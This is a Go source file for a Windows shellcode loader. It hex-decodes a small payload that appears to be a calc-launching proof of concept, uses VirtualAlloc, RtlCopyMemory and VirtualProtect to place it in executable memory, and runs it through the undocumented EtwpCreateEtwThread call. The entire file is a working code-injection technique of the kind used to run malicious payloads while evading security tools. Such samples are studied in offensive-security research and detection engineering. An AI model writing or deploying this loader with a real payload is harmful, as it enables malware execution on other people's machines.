package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

func main() {
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("%s", errShellcode.Error()))
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	EtwpCreateEtwThread := ntdll.NewProc("EtwpCreateEtwThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("")
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("%s", errRtlCopyMemory.Error()))
	}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("%s", errVirtualProtect.Error()))
	}
	thread, _, errEtwThread := EtwpCreateEtwThread.Call(addr, uintptr(0))

	if errEtwThread != nil && errEtwThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("%s", errEtwThread.Error()))
	}
	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("%s", errWaitForSingleObject.Error()))
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goEtwpCreateEtwThread.exe cmd/EtwpCreateEtwThread/main.go
